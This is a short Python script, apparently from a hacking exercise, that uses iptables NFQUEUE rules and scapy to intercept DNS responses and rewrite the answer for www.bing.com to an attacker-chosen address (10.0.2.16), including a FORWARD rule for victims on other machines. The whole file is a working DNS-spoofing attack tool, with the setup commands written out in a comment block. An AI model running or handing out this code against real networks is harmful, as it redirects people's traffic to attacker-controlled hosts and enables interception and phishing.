import netfilterqueue
import scapy.all as scapy

'''
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I Forward -j NFQUEUE --queue-num 0  (For remote machines)
ping -c 1 www.bing.com
'''


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:  # Target ip address
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")  # No need to fill all params
            scapy_packet[scapy.DNS].an = answer  # Injecting our data
            scapy_packet[scapy.DNS].ancount = 1  # Injecting our data

            # remove the length and checksum field from our packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
        # print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
